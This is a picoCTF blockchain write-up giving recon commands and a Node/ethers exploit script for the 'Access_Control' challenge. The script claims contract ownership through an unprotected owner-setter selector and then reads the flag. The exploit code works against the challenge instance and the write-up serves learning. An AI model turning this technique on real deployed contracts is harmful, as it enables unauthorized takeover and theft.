---
title: "Access_Control Writeup"
description: "picoCTF Access Control writeup exploiting an unprotected owner-setter function in a Solidity smart contract to claim ownership and reveal the flag."
category: "picoCTF - Blockchain"
tags: ["picoctf", "blockchain"]
published: true
---
# Access_Control Writeup

Flag: picoCTF{<redacted>}

Tools used
- `curl`
- `rg`
- `node`
- `npm install ethers@6`
- `ethers` (installed under `/tmp/node_modules`)

Endpoints
- Web app: `http://lonely-island.picoctf.net:52648/`
- RPC: `http://lonely-island.picoctf.net:62620`
- Contract: `0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9`
- Player: `0xECd115dC14231719f96d08c648476F3128F49C81`

Recon commands
```bash
curl -L http://lonely-island.picoctf.net:52648/
curl -L http://lonely-island.picoctf.net:52648/status
curl -s -X POST http://lonely-island.picoctf.net:62620 -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"eth_chainId","params":[],"id":1}'
curl -s -X POST http://lonely-island.picoctf.net:62620 -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"eth_getCode","params":["0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9","latest"],"id":1}'
```

Dependency setup
```bash
cd /tmp
npm install ethers@6
```

Exploit summary
- The deployed bytecode exposed an unprotected owner-setting function at selector `0xa6f9dae1`.
- After setting `owner` to the player address, an owner-only function at selector `0x890d6908` marked the challenge solved.
- The flag was then readable via selector `0xf9633930`.

Exploit script
```bash
node - <<'NODE'
const { ethers } = require('/tmp/node_modules/ethers');
const rpc = 'http://lonely-island.picoctf.net:62620';
const pk = '0xc3eeb0fddf58a623f9036b6e6d15a2111018cf938ff42a1bb09af4af87a314a5';
const contract = '0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9';
const player = '0xECd115dC14231719f96d08c648476F3128F49C81';

(async () => {
  const provider = new ethers.JsonRpcProvider(rpc);
  const wallet = new ethers.Wallet(pk, provider);

  const tx1 = await wallet.sendTransaction({
    to: contract,
    data: '0xa6f9dae1' + player.toLowerCase().slice(2).padStart(64, '0')
  });
  await tx1.wait();

  const tx2 = await wallet.sendTransaction({
    to: contract,
    data: '0x890d6908'
  });
  await tx2.wait();

  const flagData = await provider.call({ to: contract, data: '0xf9633930' });
  const [flag] = ethers.AbiCoder.defaultAbiCoder().decode(['string'], flagData);
  console.log(flag);
})();
NODE
```

Verification
```bash
curl -s http://lonely-island.picoctf.net:52648/status
```
